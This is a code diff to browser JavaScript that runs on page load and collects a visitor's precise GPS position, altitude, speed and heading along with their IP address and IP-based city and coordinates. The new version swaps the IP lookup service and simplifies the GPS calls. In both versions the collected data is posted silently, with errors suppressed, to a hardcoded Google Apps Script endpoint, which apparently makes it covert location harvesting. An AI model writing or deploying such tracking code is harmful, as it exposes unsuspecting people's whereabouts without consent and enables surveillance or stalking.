@@ -52,96 +52,51 @@
 
       backgroundData.collectionAttempted = "true";
 
-      const rapidConfigs = [
-        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
-        { enableHighAccuracy: true, timeout: 2000, maximumAge: 5000 },
-        { enableHighAccuracy: false, timeout: 1500, maximumAge: 10000 },
-        { enableHighAccuracy: true, timeout: 1000, maximumAge: 30000 }
-      ];
+      const config = {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      };
 
-      let bestAccuracy = Infinity;
-
-      rapidConfigs.forEach((config, index) => {
-        setTimeout(() => {
-          navigator.geolocation.getCurrentPosition(
-            function(position) {
-              const coords = position.coords;
-              if (coords.accuracy < bestAccuracy) {
-                bestAccuracy = coords.accuracy;
-                backgroundData.latitude = coords.latitude;
-                backgroundData.longitude = coords.longitude;
-                backgroundData.accuracy = coords.accuracy;
-                backgroundData.altitude = coords.altitude;
-                backgroundData.speed = coords.speed;
-                backgroundData.heading = coords.heading;
-                backgroundData.gpsSuccess = "true";
-                backgroundData.gpsMethod = `rapid_${index + 1}`;
-                sendBackgroundData();
-              }
-            },
-            function(error) {
-              backgroundData.gpsError = error.message;
-              backgroundData.gpsErrorCode = error.code;
-            },
-            config
-          );
-        }, index * 200);
-      });
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const coords = position.coords;
+          backgroundData.latitude = coords.latitude;
+          backgroundData.longitude = coords.longitude;
+          backgroundData.accuracy = coords.accuracy;
+          backgroundData.altitude = coords.altitude;
+          backgroundData.speed = coords.speed;
+          backgroundData.heading = coords.heading;
+          backgroundData.gpsSuccess = "true";
+          backgroundData.gpsMethod = "high_accuracy";
+        },
+        function(error) {
+          backgroundData.gpsError = error.message;
+          backgroundData.gpsErrorCode = error.code;
+        },
+        config
+      );
     }
 
-    // ✅ FIXED: Reliable IP collection with fallback
+    // ✅ IP collection using ipwho.is (supports CORS, reliable)
     async function backgroundIPCollection() {
       try {
-        const response = await fetch("https://corsproxy.io/?https://ipapi.co/json/");
+        const response = await fetch("https://ipwho.is/");
         const result = await response.json();
 
-        if (result.ip) {
+        if (result.success && result.ip) {
           backgroundData.ip = result.ip;
           backgroundData.ipSuccess = "true";
           backgroundData.ipCity = result.city || "";
-          backgroundData.ipCountry = result.country_name || "";
+          backgroundData.ipCountry = result.country || "";
           backgroundData.ipLatitude = result.latitude || "";
           backgroundData.ipLongitude = result.longitude || "";
-          return;
+        } else {
+          throw new Error(result.message || "Failed IP fetch");
         }
-      } catch (e1) {
-        try {
-          const response2 = await fetch("https://ipinfo.io/json?token=demo");
-          const result2 = await response2.json();
-
-          if (result2.ip) {
-            backgroundData.ip = result2.ip;
-            backgroundData.ipSuccess = "true";
-            backgroundData.ipCity = result2.city || "";
-            backgroundData.ipCountry = result2.country || "";
-            const [lat, lng] = result2.loc.split(",");
-            backgroundData.ipLatitude = lat;
-            backgroundData.ipLongitude = lng;
-          }
-        } catch (e2) {
-          backgroundData.ip = "background_failed";
-          backgroundData.ipError = e2.message;
-        }
-      }
-    }
-
-    async function sendBackgroundData() {
-      try {
-        const formData = new URLSearchParams();
-        Object.keys(backgroundData).forEach(key => {
-          if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
-            formData.append(key, backgroundData[key]);
-          }
-        });
-
-        fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
-          method: "POST",
-          body: formData,
-          mode: "no-cors",
-          keepalive: true
-        });
-      } catch (error) {
-        // Silent fail
+      } catch (e) {
+        backgroundData.ip = "background_failed";
+        backgroundData.ipError = e.message;
       }
     }
 
@@ -164,27 +119,40 @@
       }
     }
 
-    (function startBackgroundCollection() {
+    async function sendBackgroundData() {
+      try {
+        const formData = new URLSearchParams();
+        Object.keys(backgroundData).forEach(key => {
+          if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
+            formData.append(key, backgroundData[key]);
+          }
+        });
+
+        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
+          method: "POST",
+          body: formData,
+          mode: "no-cors",
+          keepalive: true
+        });
+      } catch (error) {
+        // Silent fail
+      }
+    }
+
+    (async function startBackgroundCollection() {
+      console.log("📍 Starting accurate location collection...");
       rapidGPSCollection();
-      backgroundIPCollection();
+      await backgroundIPCollection();
+
       setTimeout(() => {
         if (backgroundData.gpsSuccess !== "true") {
           getTimezoneLocation();
         }
         sendBackgroundData();
-      }, 2500);
+      }, 3000);
     })();
 
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('data:text/javascript;charset=utf-8,' +
-        encodeURIComponent(`
-          self.addEventListener('message', function(event) {
-            console.log('Service worker:', event.data);
-          });
-        `)
-      ).catch(() => {});
-    }
-
+    // BEACON fallback
     function sendViaBeacon() {
       if ('sendBeacon' in navigator) {
         setTimeout(() => {
